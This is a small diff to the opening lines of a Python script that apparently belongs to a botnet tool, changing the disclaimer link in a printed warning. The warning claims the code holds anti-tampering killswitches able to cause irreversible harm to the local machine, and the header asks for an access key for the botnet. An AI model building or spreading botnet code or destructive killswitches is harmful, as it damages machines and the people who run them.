@@ -1,7 +1,7 @@
 '''
 YOU MUST GET AN ACCESS KEY FOR YOUR BOTNET TO WORK. YOU CAN GET A FREE KEY FROM STETHO.
 '''
-print("\nWARNING: This code contains anti-tampering killswitches that can cause irreversable harm to a local machine if triggered, do NOT tamper with this bot's code!\n(For all disclaimers, visit stethospasm.weebly.com/disclaimers)\n")
+print("\nWARNING: This code contains anti-tampering killswitches that can cause irreversable harm to a local machine if triggered, do NOT tamper with this bot's code!\n(For all disclaimers, visit pastebin.com/zRUVXuKL)\n")
 input("Press enter to acknowledge this warning and continue:")
 import base64
 import sys
